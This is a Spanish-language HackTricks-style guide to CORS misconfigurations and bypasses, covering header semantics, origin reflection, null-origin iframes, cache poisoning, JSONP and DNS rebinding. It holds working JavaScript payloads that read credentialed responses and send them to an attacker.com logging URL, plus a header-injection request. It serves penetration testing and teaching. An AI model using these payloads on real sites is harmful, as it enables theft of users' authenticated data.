# CORS - Configuraciones incorrectas y Bypass

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## ¬øQu√© es CORS?

El est√°ndar Cross-Origin Resource Sharing (CORS) **permite a los servidores definir qui√©n puede acceder a sus activos** y **qu√© m√©todos de solicitud HTTP est√°n permitidos** desde fuentes externas.

Una pol√≠tica de **mismo origen** exige que un **servidor que solicita** un recurso y el servidor que **aloja el recurso** compartan el mismo protocolo (por ejemplo, `http://`), nombre de dominio (por ejemplo, `internal-web.com`) y **puerto** (por ejemplo, 80). Bajo esta pol√≠tica, solo se permite el acceso a los recursos a las p√°ginas web del mismo dominio y puerto.

La aplicaci√≥n de la pol√≠tica de mismo origen en el contexto de `http://normal-website.com/example/example.html` se ilustra de la siguiente manera:

| URL accedida                              | ¬øAcceso permitido?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | S√≠: Esquema, dominio y puerto id√©nticos |
| `http://normal-website.com/example2/`     | S√≠: Esquema, dominio y puerto id√©nticos |
| `https://normal-website.com/example/`     | No: Esquema y puerto diferentes      |
| `http://en.normal-website.com/example/`   | No: Dominio diferente               |
| `http://www.normal-website.com/example/`  | No: Dominio diferente               |
| `http://normal-website.com:8080/example/` | No: Puerto diferente*                |

*Internet Explorer ignora el n√∫mero de puerto al hacer cumplir la pol√≠tica de mismo origen, permitiendo as√≠ este acceso.

### Encabezado `Access-Control-Allow-Origin`

Este encabezado puede permitir **m√∫ltiples or√≠genes**, un valor **`null`**, o un comod√≠n **`*`**. Sin embargo, **ning√∫n navegador admite m√∫ltiples or√≠genes**, y el uso del comod√≠n `*` est√° sujeto a **limitaciones**. (El comod√≠n debe usarse solo, y no se permite su uso junto con `Access-Control-Allow-Credentials: true`).

Este encabezado es **emitido por un servidor** en respuesta a una solicitud de recurso entre dominios iniciada por un sitio web, con el navegador a√±adiendo autom√°ticamente un encabezado `Origin`.

### Encabezado `Access-Control-Allow-Credentials`

Por **defecto**, las solicitudes entre dominios se realizan sin credenciales como cookies o el encabezado de Autorizaci√≥n. Sin embargo, un servidor entre dominios puede permitir la lectura de la respuesta cuando se env√≠an credenciales configurando el encabezado `Access-Control-Allow-Credentials` a **`true`**.

Si se establece en `true`, el navegador transmitir√° credenciales (cookies, encabezados de autorizaci√≥n o certificados de cliente TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Solicitud previa CSRF

### Comprendiendo las Solicitudes Previas en la Comunicaci√≥n entre Dominios

Al iniciar una solicitud entre dominios bajo condiciones espec√≠ficas, como usar un **m√©todo HTTP no est√°ndar** (cualquier cosa que no sea HEAD, GET, POST), introducir nuevos **encabezados**, o emplear un valor especial en el encabezado **Content-Type**, puede ser necesaria una solicitud previa. Esta solicitud preliminar, aprovechando el m√©todo **`OPTIONS`**, sirve para informar al servidor sobre las intenciones de la pr√≥xima solicitud entre or√≠genes, incluyendo los m√©todos HTTP y encabezados que pretende utilizar.

El protocolo de **Compartici√≥n de Recursos de Origen Cruzado (CORS)** exige esta verificaci√≥n previa para determinar la viabilidad de la operaci√≥n entre or√≠genes solicitada, verificando los m√©todos permitidos, los encabezados y la confiabilidad del origen. Para comprender detalladamente qu√© condiciones evitan la necesidad de una solicitud previa, consulta la gu√≠a completa proporcionada por [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

Es crucial tener en cuenta que la **ausencia de una solicitud previa no elimina la necesidad de que la respuesta lleve encabezados de autorizaci√≥n**. Sin estos encabezados, el navegador no puede procesar la respuesta de la solicitud entre or√≠genes.

Considera la siguiente ilustraci√≥n de una solicitud previa dirigida a utilizar el m√©todo `PUT` junto con un encabezado personalizado llamado `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
En respuesta, el servidor podr√≠a devolver encabezados que indiquen los m√©todos aceptados, el origen permitido y otros detalles de la pol√≠tica CORS, como se muestra a continuaci√≥n:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Este encabezado especifica qu√© encabezados se pueden utilizar durante la solicitud real. Es establecido por el servidor para indicar los encabezados permitidos en las solicitudes del cliente.
- **`Access-Control-Expose-Headers`**: A trav√©s de este encabezado, el servidor informa al cliente sobre qu√© encabezados se pueden exponer como parte de la respuesta adem√°s de los encabezados de respuesta simples.
- **`Access-Control-Max-Age`**: Este encabezado indica cu√°nto tiempo pueden ser almacenados en cach√© los resultados de una solicitud previa. El servidor establece el tiempo m√°ximo, en segundos, que la informaci√≥n devuelta por una solicitud previa puede ser reutilizada.
- **`Access-Control-Request-Headers`**: Utilizado en solicitudes previas, este encabezado es establecido por el cliente para informar al servidor sobre qu√© encabezados HTTP desea utilizar en la solicitud real.
- **`Access-Control-Request-Method`**: Este encabezado, tambi√©n utilizado en solicitudes previas, es establecido por el cliente para indicar qu√© m√©todo HTTP se utilizar√° en la solicitud real.
- **`Origin`**: Este encabezado es establecido autom√°ticamente por el navegador e indica el origen de la solicitud de origen cruzado. Es utilizado por el servidor para evaluar si la solicitud entrante debe ser permitida o denegada bas√°ndose en la pol√≠tica CORS.


Ten en cuenta que generalmente (dependiendo del tipo de contenido y los encabezados establecidos) en una solicitud **GET/POST no se env√≠a una solicitud previa** (la solicitud se env√≠a **directamente**), pero si deseas acceder a los **encabezados/cuerpo de la respuesta**, debe contener un encabezado _Access-Control-Allow-Origin_ que lo permita.\
**Por lo tanto, CORS no protege contra CSRF (pero puede ser √∫til).**

### **Solicitud previa de red local**

1. **`Access-Control-Request-Local-Network`**: Este encabezado se incluye en la solicitud del cliente para indicar que la consulta est√° dirigida a un recurso de red local. Sirve como un marcador para informar al servidor que la solicitud proviene desde la red local.

2. **`Access-Control-Allow-Local-Network`**: En respuesta, los servidores utilizan este encabezado para comunicar que el recurso solicitado est√° permitido para ser compartido con entidades fuera de la red local. Act√∫a como una luz verde para compartir recursos a trav√©s de diferentes l√≠mites de red, asegurando un acceso controlado mientras se mantienen los protocolos de seguridad.

Una **respuesta v√°lida que permita la solicitud de red local** tambi√©n debe tener en la respuesta el encabezado `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Ten en cuenta que la IP de linux **0.0.0.0** funciona para **burlar** estos requisitos y acceder a localhost, ya que esta direcci√≥n IP no se considera "local".

Tambi√©n es posible **burlar los requisitos de la Red Local** si se utiliza la **direcci√≥n IP p√∫blica de un punto final local** (como la IP p√∫blica del enrutador). Porque en varias ocasiones, incluso si se accede a la **IP p√∫blica**, si es **desde la red local**, se conceder√° el acceso.


{% endhint %}

## Configuraciones incorrectas explotables

Se ha observado que establecer `Access-Control-Allow-Credentials` en **`true`** es un requisito previo para la mayor√≠a de los **ataques reales**. Esta configuraci√≥n permite al navegador enviar credenciales y leer la respuesta, mejorando la efectividad del ataque. Sin esto, el beneficio de hacer que un navegador emita una solicitud en lugar de hacerlo uno mismo disminuye, ya que se vuelve inviable aprovechar las cookies de un usuario.

### Excepci√≥n: Explotar la Ubicaci√≥n de la Red como Autenticaci√≥n

Existe una excepci√≥n donde la ubicaci√≥n de la red de la v√≠ctima act√∫a como una forma de autenticaci√≥n. Esto permite que el navegador de la v√≠ctima se utilice como un proxy, eludiendo la autenticaci√≥n basada en IP para acceder a aplicaciones de intranet. Este m√©todo comparte similitudes en impacto con el reenv√≠o de DNS pero es m√°s f√°cil de explotar.

### Reflejo de `Origin` en `Access-Control-Allow-Origin`

El escenario del mundo real donde el valor del encabezado `Origin` se refleja en `Access-Control-Allow-Origin` es te√≥ricamente improbable debido a las restricciones para combinar estos encabezados. Sin embargo, los desarrolladores que buscan habilitar CORS para m√∫ltiples URL pueden generar din√°micamente el encabezado `Access-Control-Allow-Origin` copiando el valor del encabezado `Origin`. Este enfoque puede introducir vulnerabilidades, especialmente cuando un atacante utiliza un dominio con un nombre dise√±ado para parecer leg√≠timo, enga√±ando as√≠ a la l√≥gica de validaci√≥n.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Explotando el Origen `null`

El origen `null`, especificado para situaciones como redirecciones o archivos HTML locales, tiene una posici√≥n √∫nica. Algunas aplicaciones incluyen este origen en listas blancas para facilitar el desarrollo local, permitiendo inadvertidamente que cualquier sitio web imite un origen `null` a trav√©s de un iframe con sandbox, evitando as√≠ las restricciones de CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### T√©cnicas de Bypass de Expresiones Regulares

Al encontrarse con una lista blanca de dominios, es crucial probar oportunidades de bypass, como agregar el dominio del atacante a un dominio en la lista blanca o explotar vulnerabilidades de apropiaci√≥n de subdominios. Adem√°s, las expresiones regulares utilizadas para la validaci√≥n de dominios pueden pasar por alto matices en las convenciones de nomenclatura de dominios, presentando m√°s oportunidades de bypass.

### Bypasses Avanzados de Expresiones Regulares

Los patrones Regex suelen concentrarse en caracteres alfanum√©ricos, punto (.), y guion (-), descuidando otras posibilidades. Por ejemplo, un nombre de dominio dise√±ado para incluir caracteres interpretados de manera diferente por los navegadores y patrones Regex puede evadir controles de seguridad. La forma en que Safari, Chrome y Firefox manejan los caracteres de guion bajo en subdominios ilustra c√≥mo estas discrepancias pueden ser explotadas para eludir la l√≥gica de validaci√≥n de dominios.

**Para obtener m√°s informaci√≥n y configuraciones de esta verificaci√≥n de bypass:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **y** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Desde XSS dentro de un subdominio

Los desarrolladores a menudo implementan mecanismos defensivos para protegerse contra la explotaci√≥n de CORS al incluir en la lista blanca dominios que tienen permiso para solicitar informaci√≥n. A pesar de estas precauciones, la seguridad del sistema no es infalible. La presencia de incluso un solo subdominio vulnerable dentro de los dominios en la lista blanca puede abrir la puerta a la explotaci√≥n de CORS a trav√©s de otras vulnerabilidades, como XSS (Cross-Site Scripting).

Para ilustrar, considera el escenario donde un dominio, `requester.com`, est√° en la lista blanca para acceder a recursos de otro dominio, `provider.com`. La configuraci√≥n del lado del servidor podr√≠a verse algo as√≠:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
En esta configuraci√≥n, se permite el acceso a todos los subdominios de `requester.com`. Sin embargo, si un subdominio, por ejemplo `sub.requester.com`, se ve comprometido con una vulnerabilidad XSS, un atacante puede aprovechar esta debilidad. Por ejemplo, un atacante con acceso a `sub.requester.com` podr√≠a explotar la vulnerabilidad XSS para eludir las pol√≠ticas de CORS y acceder maliciosamente a recursos en `provider.com`.


### **Envenenamiento de cach√© en el lado del servidor**

**[De esta investigaci√≥n](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

Es posible que al explotar el envenenamiento de cach√© en el lado del servidor a trav√©s de la inyecci√≥n de encabezados HTTP, se pueda inducir una vulnerabilidad almacenada de Cross-Site Scripting (XSS). Este escenario se desarrolla cuando una aplicaci√≥n no desinfecta el encabezado `Origin` de caracteres ilegales, creando una vulnerabilidad especialmente para los usuarios de Internet Explorer y Edge. Estos navegadores tratan `\r` (0x0d) como un terminador leg√≠timo de encabezados HTTP, lo que lleva a vulnerabilidades de inyecci√≥n de encabezados HTTP.

Considere la siguiente solicitud donde se manipula el encabezado `Origin`:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer y Edge interpretan la respuesta como:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Mientras que explotar directamente esta vulnerabilidad haciendo que un navegador web env√≠e un encabezado malformado no es factible, una solicitud creada puede ser generada manualmente utilizando herramientas como Burp Suite. Este m√©todo podr√≠a llevar a que una cach√© del lado del servidor guarde la respuesta y la sirva inadvertidamente a otros. La carga creada tiene como objetivo alterar el conjunto de caracteres de la p√°gina a UTF-7, una codificaci√≥n de caracteres a menudo asociada con vulnerabilidades XSS debido a su capacidad para codificar caracteres de una manera que puede ser ejecutada como script en ciertos contextos.

Para m√°s lecturas sobre vulnerabilidades XSS almacenadas, consulta [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Nota**: La explotaci√≥n de vulnerabilidades de inyecci√≥n de encabezados HTTP, particularmente a trav√©s de envenenamiento de cach√© del lado del servidor, subraya la importancia cr√≠tica de validar y sanear toda la entrada proporcionada por el usuario, incluidos los encabezados HTTP. Siempre emplea un modelo de seguridad s√≥lido que incluya validaci√≥n de entrada para prevenir tales vulnerabilidades.


### **Envenenamiento de cach√© del lado del cliente**

**[De esta investigaci√≥n](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

En este escenario, se observa una instancia de una p√°gina web que refleja el contenido de un encabezado HTTP personalizado sin codificaci√≥n adecuada. Espec√≠ficamente, la p√°gina web refleja el contenido incluido en un encabezado `X-User-id`, que podr√≠a incluir JavaScript malicioso, como se demuestra en el ejemplo donde el encabezado contiene una etiqueta de imagen SVG dise√±ada para ejecutar c√≥digo JavaScript al cargarse.

Las pol√≠ticas de Compartir Recursos de Origen (CORS) permiten el env√≠o de encabezados personalizados. Sin embargo, sin que la respuesta sea renderizada directamente por el navegador debido a restricciones CORS, la utilidad de tal inyecci√≥n podr√≠a parecer limitada. El punto cr√≠tico surge al considerar el comportamiento de la cach√© del navegador. Si el encabezado `Vary: Origin` no est√° especificado, se vuelve posible que la respuesta maliciosa sea almacenada en la cach√© del navegador. Posteriormente, esta respuesta en cach√© podr√≠a ser renderizada directamente al navegar a la URL, evitando la necesidad de renderizaci√≥n directa en la solicitud inicial. Este mecanismo mejora la fiabilidad del ataque al aprovechar la cach√© del lado del cliente.

Para ilustrar este ataque, se proporciona un ejemplo de JavaScript, dise√±ado para ser ejecutado en el entorno de una p√°gina web, como a trav√©s de un JSFiddle. Este script realiza una acci√≥n simple: env√≠a una solicitud a una URL especificada con un encabezado personalizado que contiene el JavaScript malicioso. Tras completar con √©xito la solicitud, intenta navegar a la URL objetivo, potencialmente desencadenando la ejecuci√≥n del script inyectado si la respuesta ha sido almacenada en cach√© sin un manejo adecuado del encabezado `Vary: Origin`.

Aqu√≠ se presenta un resumen del JavaScript utilizado para ejecutar este ataque:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, tambi√©n conocido como Inclusi√≥n de Script de Sitio Cruzado, es un tipo de vulnerabilidad que aprovecha el hecho de que la Pol√≠tica de la Misma Origen (SOP) no se aplica al incluir recursos utilizando la etiqueta de script. Esto se debe a que los scripts deben poder incluirse desde diferentes dominios. Esta vulnerabilidad permite a un atacante acceder y leer cualquier contenido que se haya incluido utilizando la etiqueta de script.

Esta vulnerabilidad se vuelve particularmente significativa cuando se trata de JavaScript din√°mico o JSONP (JSON con Relleno), especialmente cuando se utilizan informaci√≥n de autoridad ambiental como cookies para la autenticaci√≥n. Al solicitar un recurso de un host diferente, las cookies se incluyen, lo que las hace accesibles para el atacante.

Para comprender mejor y mitigar esta vulnerabilidad, puedes utilizar el complemento BurpSuite disponible en [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Este complemento puede ayudar a identificar y abordar posibles vulnerabilidades XSSI en tus aplicaciones web.

[**Lee m√°s sobre los diferentes tipos de XSSI y c√≥mo explotarlos aqu√≠.**](xssi-cross-site-script-inclusion.md)

Intenta agregar un **par√°metro de `callback`** en la solicitud. Tal vez la p√°gina estaba preparada para enviar los datos como JSONP. En ese caso, la p√°gina enviar√° los datos con `Content-Type: application/javascript`, lo que eludir√° la pol√≠tica CORS.

![](<../.gitbook/assets/image (229).png>)

### Bypass F√°cil (¬øin√∫til?)

Una forma de eludir la restricci√≥n de `Access-Control-Allow-Origin` es solicitando a una aplicaci√≥n web que realice una solicitud en tu nombre y env√≠e la respuesta de vuelta. Sin embargo, en este escenario, las credenciales de la v√≠ctima final no se enviar√°n, ya que la solicitud se realiza a un dominio diferente.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Esta herramienta proporciona un proxy que reenv√≠a tu solicitud junto con sus encabezados, al mismo tiempo que falsifica el encabezado de Origen para que coincida con el dominio solicitado. Esto elude efectivamente la pol√≠tica CORS. Aqu√≠ tienes un ejemplo de uso con XMLHttpRequest:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Esta herramienta ofrece un enfoque alternativo para el enrutamiento de solicitudes. En lugar de pasar tu solicitud tal cual, el servidor realiza su propia solicitud con los par√°metros especificados.

### Bypass de Iframe + Popup

Puedes **eludir las verificaciones CORS** como `e.origin === window.origin` al **crear un iframe** y **desde √©l abrir una nueva ventana**. M√°s informaci√≥n en la siguiente p√°gina:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Rebinding de DNS a trav√©s de TTL

El rebinding de DNS a trav√©s de TTL es una t√©cnica utilizada para eludir ciertas medidas de seguridad manipulando los registros DNS. As√≠ es como funciona:

1. El atacante crea una p√°gina web y hace que la v√≠ctima la acceda.
2. Luego, el atacante cambia el DNS (IP) de su propio dominio para que apunte a la p√°gina web de la v√≠ctima.
3. El navegador de la v√≠ctima almacena en cach√© la respuesta DNS, que puede tener un valor de TTL (Tiempo de Vida) que indica cu√°nto tiempo debe considerarse v√°lido el registro DNS.
4. Cuando el TTL expira, el navegador de la v√≠ctima realiza una nueva solicitud DNS, lo que permite al atacante ejecutar c√≥digo JavaScript en la p√°gina de la v√≠ctima.
5. Al mantener el control sobre la IP de la v√≠ctima, el atacante puede recopilar informaci√≥n de la v√≠ctima sin enviar cookies al servidor de la v√≠ctima.

Es importante tener en cuenta que los navegadores tienen mecanismos de almacenamiento en cach√© que pueden evitar el abuso inmediato de esta t√©cnica, incluso con valores de TTL bajos.

El rebinding de DNS puede ser √∫til para eludir comprobaciones expl√≠citas de IP realizadas por la v√≠ctima o para escenarios en los que un usuario o bot permanece en la misma p√°gina durante un per√≠odo prolongado, lo que permite que caduque la cach√©.

Si necesitas una forma r√°pida de abusar del rebinding de DNS, puedes utilizar servicios como [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Para ejecutar tu propio servidor de rebinding de DNS, puedes utilizar herramientas como **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Esto implica exponer tu puerto local 53/udp, crear un registro A que apunte a √©l (por ejemplo, ns.example.com) y crear un registro NS que apunte al subdominio A creado anteriormente (por ejemplo, ns.example.com). Cualquier subdominio del subdominio ns.example.com se resolver√° entonces en tu host.

Tambi√©n puedes explorar un servidor en funcionamiento p√∫blicamente en [http://rebind.it/singularity.html](http://rebind.it/singularity.html) para comprender y experimentar m√°s.

### Rebinding de DNS a trav√©s de **Sobrecarga de Cach√© DNS**

El rebinding de DNS a trav√©s de la sobrecarga de cach√© DNS es otra t√©cnica utilizada para eludir el mecanismo de almacenamiento en cach√© de los navegadores y forzar una segunda solicitud DNS. As√≠ es como funciona:

1. Inicialmente, cuando la v√≠ctima realiza una solicitud DNS, recibe como respuesta la direcci√≥n IP del atacante.
2. Para eludir la defensa de almacenamiento en cach√©, el atacante aprovecha un trabajador de servicio. El trabajador de servicio sobrecarga la cach√© DNS, lo que efectivamente elimina el nombre de servidor en cach√© del atacante.
3. Cuando el navegador de la v√≠ctima realiza una segunda solicitud DNS, ahora recibe como respuesta la direcci√≥n IP 127.0.0.1, que normalmente se refiere a localhost.

Al sobrecargar la cach√© DNS con el trabajador de servicio, el atacante puede manipular el proceso de resoluci√≥n DNS y forzar al navegador de la v√≠ctima a realizar una segunda solicitud, que esta vez se resuelve con la direcci√≥n IP deseada por el atacante.

### Rebinding de DNS a trav√©s de **Cach√©**

Otra forma de eludir la defensa de almacenamiento en cach√© es utilizando m√∫ltiples direcciones IP para el mismo subdominio en el proveedor DNS. As√≠ es como funciona:

1. El atacante configura dos registros A (o un solo registro A con dos IPs) para el mismo subdominio en el proveedor DNS.
2. Cuando un navegador verifica estos registros, recibe ambas direcciones IP.
3. Si el navegador decide usar primero la direcci√≥n IP del atacante, este puede servir un payload que realice solicitudes HTTP al mismo dominio.
4. Sin embargo, una vez que el atacante obtiene la direcci√≥n IP de la v√≠ctima, deja de responder al navegador de la v√≠ctima.
5. El navegador de la v√≠ctima, al darse cuenta de que el dominio no responde, pasa a utilizar la segunda direcci√≥n IP proporcionada.
6. Al acceder a la segunda direcci√≥n IP, el navegador elude la Pol√≠tica de la Misma Origen (SOP), lo que permite al atacante abusar de esto y recopilar y extraer informaci√≥n.

Esta t√©cnica aprovecha el comportamiento de los navegadores cuando se proporcionan m√∫ltiples direcciones IP para un dominio. Al controlar estrat√©gicamente las respuestas y manipular la elecci√≥n de la direcci√≥n IP del navegador, un atacante puede explotar la SOP y acceder a la informaci√≥n de la v√≠ctima.

{% hint style="warning" %}
Ten en cuenta que para acceder a localhost debes intentar reasignar **127.0.0.1** en Windows y **0.0.0.0** en Linux.\
Proveedores como godaddy o cloudflare no me permitieron usar la IP 0.0.0.0, pero AWS route53 me permiti√≥ crear un registro A con 2 IPs siendo una de ellas "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

Para obtener m√°s informaci√≥n, puedes consultar [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Otros Bypass Comunes

* Si no se permiten **IPs internas**, es posible que **olvidaran prohibir 0.0.0.0** (funciona en Linux y Mac)
* Si no se permiten **IPs internas**, responde con un **CNAME** a **localhost** (funciona en Linux y Mac)
* Si no se permiten **IPs internas** como respuestas DNS, puedes responder **CNAMEs a servicios internos** como www.corporate.internal.

### Armas de Rebinding de DNS

Puedes encontrar m√°s informaci√≥n sobre las t√©cnicas de bypass anteriores y c√≥mo utilizar la siguiente herramienta en la charla [Gerald Doussot - Estado de los Ataques de Rebinding de DNS y Singularidad de Origen - Conferencia DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularidad de Origen`**](https://github.com/nccgroup/singularity) es una herramienta para realizar ataques de [rebinding de DNS](https://en.wikipedia.org/wiki/DNS\_rebinding). Incluye los componentes necesarios para reasignar la direcci√≥n IP del nombre DNS del servidor de ataque a la direcci√≥n IP de la m√°quina objetivo y para servir payloads de ataque para explotar software vulnerable en la m√°quina objetivo.

### Protecci√≥n Real contra el Rebinding de DNS

* Utiliza TLS en servicios internos
* Solicita autenticaci√≥n para acceder a los datos
* Valida el encabezado Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Propuesta para enviar siempre una solicitud previa cuando los servidores p√∫blicos quieran acceder a servidores internos

## **Herramientas**

**Prueba posibles configuraciones incorrectas en las pol√≠ticas CORS**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Referencias
* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)
